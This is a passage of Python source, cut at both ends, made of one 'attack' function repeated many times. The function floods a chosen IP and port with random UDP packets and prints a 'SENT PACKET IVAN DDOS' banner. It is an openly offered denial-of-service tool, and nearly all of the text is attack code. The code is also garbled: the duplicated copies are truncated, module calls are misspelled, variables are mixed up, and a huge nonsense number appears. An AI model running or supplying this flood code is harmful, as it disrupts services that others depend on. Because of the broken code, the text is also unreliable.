        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
